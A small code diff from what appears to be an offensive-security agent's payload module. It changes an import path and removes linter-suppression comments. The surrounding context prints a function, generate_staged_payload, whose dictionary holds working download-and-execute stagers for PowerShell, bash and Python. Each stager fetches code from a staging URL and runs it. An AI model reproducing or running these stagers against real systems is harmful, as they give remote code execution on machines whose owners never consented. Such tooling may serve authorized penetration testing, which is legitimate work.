@@ -17,7 +17,7 @@ STATE_INVARIANT_VIOLATION = "State invariant violation"
 
 # State integration
 try:
-    from core.state import AgentState, AttackPhase
+    from core.agent.state import AgentState, AttackPhase
 
     STATE_AVAILABLE = True
 except ImportError:
@@ -972,7 +972,7 @@ def generate_staged_payload(
     stagers = {
         "powershell": f'IEX(New-Object Net.WebClient).DownloadString("{stage_url}")',
         "bash": f"curl -s {stage_url} | bash",
-        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',  # noqa: S310, S102
+        "python": f'import urllib.request; exec(urllib.request.urlopen("{stage_url}").read())',
     }
 
     # Get main payload
